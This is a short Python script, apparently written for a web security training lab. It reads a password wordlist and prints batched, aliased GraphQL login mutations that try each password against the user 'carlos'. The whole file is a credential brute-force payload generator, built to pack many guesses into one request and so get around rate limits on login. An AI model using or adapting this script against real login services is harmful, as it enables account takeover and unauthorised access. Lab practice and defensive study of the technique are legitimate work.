f = open("auth_passwords.list", "r")
iter = 0
for l in f.readlines():
    word = l.strip()
    creds = 'password: "%s", username: "carlos"' % word
    # print(creds)
    iter+=1
    json_string = """
login%i: login(input: { %s }) {
        token
        success
    }""" %(iter, creds)

    print(json_string)
    